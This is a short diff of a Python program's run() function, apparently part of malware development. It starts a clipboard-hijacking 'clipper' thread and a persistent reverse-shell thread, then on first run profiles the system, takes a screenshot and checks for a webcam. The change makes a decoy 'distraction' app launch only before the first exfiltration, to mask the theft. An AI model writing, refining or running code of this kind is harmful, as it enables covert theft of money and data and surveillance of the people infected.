@@ -638,9 +638,10 @@ def run():
     # From here, run logic ONCE (original or copied, doesn't matter)
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-    launch_distraction_app()
+    # launch_distraction_app()
 
     if not already_exfiltrated():
+        launch_distraction_app()
         profile_system()
         take_screenshot()
         if check_webcam():
